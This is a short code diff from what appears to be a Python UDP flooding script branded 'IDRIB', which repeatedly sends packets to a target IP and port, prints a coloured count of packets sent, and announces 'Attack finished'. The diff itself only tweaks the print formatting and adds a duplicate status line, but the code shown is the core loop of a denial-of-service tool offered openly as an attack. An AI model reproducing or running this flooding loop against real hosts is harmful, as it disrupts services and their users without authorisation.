@@ -71,5 +71,6 @@ while True:
         white.sendto(bytes, (ip, port))
         sent = sent + 1
         print("\033[37mSend  \033[32m%s  \033[95m [IDRIB to]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
-
-print("\033[1;92mAttack finished\033[0m")
+        print("\033[37mSend  \033[32m%s  [IDRIB to]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
+        
+print("\033[92mAttack finished\033[0m")
